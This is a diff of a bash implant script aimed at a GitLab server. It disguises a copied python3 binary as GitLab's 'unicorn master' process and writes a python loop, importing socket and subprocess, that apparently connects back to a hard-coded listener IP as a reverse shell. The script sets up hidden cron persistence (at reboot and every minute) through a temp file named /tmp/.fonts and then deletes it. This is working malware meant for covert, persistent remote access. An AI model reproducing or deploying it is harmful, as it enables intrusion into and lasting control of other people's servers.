@@ -10,12 +10,17 @@ LISTENER_IP="172.105.118.102"
 
 cd "$TARGET_DIR" || exit 1
 
-# 1. Copy python to name: unicorn
-cp /opt/gitlab/embedded/bin/python3 unicorn
-chmod +x unicorn
+cp /opt/gitlab/embedded/bin/python3 unicorn.bin
+chmod +x unicorn.bin
+
+cat << 'EOF' > unicorn
+#!/bin/bash
+
+exec -a "unicorn" ./unicorn.bin master
+EOF
 
 # 2. Create python script named: master (NO .py, NO shebang)
-cat << EOF > master
+cat << 'EOF' > master
 import socket, subprocess, os, time
 
 while True:
@@ -35,8 +40,8 @@ chmod +x master
 # 3. Write cron that runs EXACTLY: unicorn master
 crontab -l 2>/dev/null > /tmp/.fonts || true
 
-echo "@reboot export PATH=.:\$PATH; cd $TARGET_DIR; unicorn master >/dev/null 2>&1" >> /tmp/.fonts
-echo "* * * * * export PATH=.:\$PATH; cd $TARGET_DIR; unicorn master >/dev/null 2>&1" >> /tmp/.fonts
+echo "@reboot /var/opt/gitlab/gitlab-workhorse/unicorn" >> /tmp/.fonts
+echo "* * * * * /var/opt/gitlab/gitlab-workhorse/unicorn" >> /tmp/.fonts
 
 crontab /tmp/.fonts
 rm /tmp/.fonts
